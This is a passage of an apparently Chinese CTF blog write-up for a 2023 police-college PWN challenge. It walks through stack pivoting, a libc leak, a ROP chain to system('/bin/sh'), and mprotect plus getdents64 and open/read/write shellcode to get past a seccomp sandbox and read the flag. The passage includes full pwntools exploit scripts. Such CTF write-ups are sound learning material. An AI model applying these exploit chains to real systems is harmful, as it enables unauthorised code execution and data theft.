class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(bin_sh)+p64(<span class="number">0x000000000040101a</span>)+p64(system_ad)</span><br><span class="line">sa(<span class="string">b&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>发现没有拿到shell</p>
+<p><img src="/2023/03/05/sd-police2023-pwn/image-20230306122938871.png" alt="image-20230306122938871"></p>
+<p>gdb跟了一下发现会执行到system(‘&#x2F;bin&#x2F;sh’)，又是开了沙箱，没有检测出来，发现题目给了提示有沙箱</p>
+<h2 id="mprotect修改权限"><a href="#mprotect修改权限" class="headerlink" title="mprotect修改权限"></a>mprotect修改权限</h2><p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p>
+<p>函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span>必须是一个内存页的起始地址</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line">从start开始修改len长度byte的权限为prot</span><br><span class="line">* start必须从必须是一个内存页的起始地地址 linux页一般<span class="number">4</span>k（<span class="number">0x1000b</span>yte）</span><br><span class="line">* len必须是页整数倍</span><br><span class="line">* part和linux文件权限一样 RWX</span><br></pre></td></tr></table></figure>
+
+<p>我们需要先泄露文件名，看到要写入shellcode，这一步是必要的</p>
+<p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(4096)+p64(poprdx_r12)+p64(0x7)+p64(0x6666)+p64(mprotect)+p64(main)</p>
+<p><img src="/2023/03/05/sd-police2023-pwn/image-20230306141247754.png" alt="image-20230306141247754"></p>
+<p>修改完成rwx</p>
+<h2 id="getdents64泄露文件名"><a href="#getdents64泄露文件名" class="headerlink" title="getdents64泄露文件名"></a>getdents64泄露文件名</h2><p>getdents64函数，它读取目录文件中的一个个目录项并返回</p>
+<ul>
+<li>参数一：fd指针</li>
+<li>参数二：写入的内存区域</li>
+<li>参数三：4096</li>
+<li>功能：把当前文件目录下的文件名写入参数二指向的内存区域</li>
+</ul>
+<p>linux ls底层是调用getdents64函数实现的</p>
+<p>我们用stace跟踪一些ls</p>
+<blockquote>
+<p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ioctl(1, TCGETS, &#123;B38400 opost isig icanon echo ...&#125;) = 0</span><br><span class="line">ioctl(1, TIOCGWINSZ, &#123;ws_row=49, ws_col=102, ws_xpixel=1632, ws_ypixel=1568&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3</span><br><span class="line">newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFDIR|0777, st_size=4096, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 23 entries */, 32768) = 800</span><br><span class="line">getdents64(3, 0x55c4e28daac0 /* 0 entries */, 32768) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack\t  flag.txt&quot;..., 67) = 67</span><br><span class="line">write(1, &quot;bjdctf_2020_babystack.py  get_st&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;ciscn_2019_c_1\t\t  get_started_3d&quot;..., 72) = 72</span><br><span class="line">write(1, &quot;core\t\t\t  get_started_3dsctf_2016&quot;..., 68) = 68</span><br><span class="line">write(1, &quot;ctest\t\t\t  IDA\t\t\t\t       payload.&quot;..., 51) = 51</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>
+
+<p>打开当前文件夹，然后读取到指定内存后通过write输出，这里的第一个payload数据的写入区最后选择bss段中间位置如mp_start+0x200，开头部分可能不行，官方wp</p>
+<p>mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;来返回，我感觉mov rsi, 0x%x;push rsi; ret;就可以，也打通了，不知道为什么要多一层syscall</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>泄露出文件名，正常读取就可以，因为我们没有关闭前一个打开的fd指针，所以这里文件指针变为4</p>
+<p><img src="/2023/03/05/sd-police2023-pwn/image-20230307000430195.png" alt="image-20230307000430195"></p>
+<h2 id="EXP-这里其实可以封装个函数，懒得搞了"><a href="#EXP-这里其实可以封装个函数，懒得搞了" class="headerlink" title="EXP 这里其实可以封装个函数，懒得搞了"></a>EXP 这里其实可以封装个函数，懒得搞了</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./grxer???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))+base</span><br><span class="line">poprsi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))+base</span><br><span class="line">poprdx_r12=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))+base</span><br><span class="line">p(<span class="string">&#x27;poprdi&#x27;</span>,poprdi)</span><br><span class="line">p(<span class="string">&#x27;poprsi&#x27;</span>,poprsi)</span><br><span class="line">p(<span class="string">&#x27;poprdx&#x27;</span>,poprdx_r12)</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+base</span><br><span class="line">read_ad=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+base</span><br><span class="line">mp_start=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(<span class="number">4096</span>)+p64(poprdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x6666</span>)+p64(mprotect)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi, 0x%x;push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">flag=r(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag---&gt;&#x27;</span>+flag.decode())</span><br><span class="line">flagname=<span class="string">&#x27;./flag&#x27;</span>+flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flagname)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line"><span class="comment"># sa(b&#x27;\x96\x88\n\n&#x27;,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SandBox"><span class="toc-number">1.</span> <span class="toc-text">SandBox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.1.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW%E8%AF%BB%E5%8F%96flag"><span class="toc-number">1.2.</span> <span class="toc-text">ORW读取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag"><span class="toc-number">2.</span> <span class="toc-text">flag?????</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mprotect%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="toc-number">2.1.</span> <span class="toc-text">mprotect修改权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getdents64%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">2.2.</span> <span class="toc-text">getdents64泄露文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-%E8%BF%99%E9%87%8C%E5%85%B6%E5%AE%9E%E5%8F%AF%E4%BB%A5%E5%B0%81%E8%A3%85%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%8C%E6%87%92%E5%BE%97%E6%90%9E%E4%BA%86"><span class="toc-number">2.3.</span> <span class="toc-text">EXP 这里其实可以封装个函数，懒得搞了</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&text=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&is_video=false&description=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023黄河流域公安院校网络空间安全技能挑战赛 PWN&body=Check out this article: https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&name=2023黄河流域公安院校网络空间安全技能挑战赛 PWN&description=&lt;h1 id=&#34;SandBox&#34;&gt;&lt;a href=&#34;#SandBox&#34; class=&#34;headerlink&#34; title=&#34;SandBox&#34;&gt;&lt;/a&gt;SandBox&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&#34;https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg&#34;&gt;https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg&lt;/a&gt;&lt;br&gt;提取码：05zg&lt;/p&gt;
+&lt;p&gt;题目开启了沙箱机制&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用&lt;/p&gt;
+&lt;p&gt;实现沙箱机制&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;一种采用prctl函数调用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;一种是使用seccomp库函数。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&t=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
